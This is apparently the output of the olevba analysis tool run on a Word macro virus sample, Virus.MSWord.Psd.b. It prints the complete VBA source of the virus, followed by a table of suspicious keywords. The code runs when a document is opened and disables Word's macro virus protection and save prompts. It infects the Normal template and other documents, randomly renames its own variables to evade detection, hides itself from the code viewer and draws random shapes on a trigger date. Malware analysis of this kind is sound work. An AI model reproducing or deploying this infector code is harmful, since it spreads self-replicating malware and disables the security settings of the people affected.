olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-0ffb5f63762582ae95cdd5daf2e377e44d8002c1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-0ffb5f63762582ae95cdd5daf2e377e44d8002c1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For JS8720 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next JS8720: End If
TK377 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OR8856 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set SS6615 = ActiveDocument.VBProject.VBComponents.Item(1)
IE412 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set SS6615 = NormalTemplate.VBProject.VBComponents.Item(1)
GA6866 = True
Call SN5927_KT793
ActiveDocument.Saved = True
End If
If GA6866 <> True And IE412 <> True Then GoTo HG5022
If GA6866 = True Then SS6615.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TK377 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If IE412 = True Then SS6615.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OR8856 - 4))
HG5022:
If OR8856 <> 0 And TK377 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function SN5927_KT793()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "JT8177": r1(2) = "FR5366": r1(3) = "QV410": r1(4) = "OP6314": r1(5) = "KT793": r1(6) = "TK377"
r1(7) = "OR8856": r1(8) = "IE412":: r1(9) = "SS6615": r1(10) = "GA6866": r1(11) = "HG5022": r1(12) = "SN5927": r1(13) = "AK2862": r1(14) = "US8523": r1(15) = "JS8720"
For JS8720 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KT793(a1, r1(JS8720))
Next JS8720
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KT793(US8523, AK2862 As String)
On Error Resume Next
Dim JT8177 As Long: Dim FR5366 As Long: Dim QV410 As Long: Dim OP6314 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
JT8177 = 1: FR5366 = 1: QV410 = .CountOfLines: OP6314 = Len(.Lines(.CountOfLines, 1))
Do While .Find(AK2862, JT8177, FR5366, QV410, OP6314, True)
strline = .Lines(JT8177, 1)
strline = Left(strline, FR5366 - 1) & US8523 & Mid(strline, OP6314)
.replaceline JT8177, strline
JT8177 = QV410 + 1: FR5366 = 1:
QV410 = .CountOfLines
OP6314 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

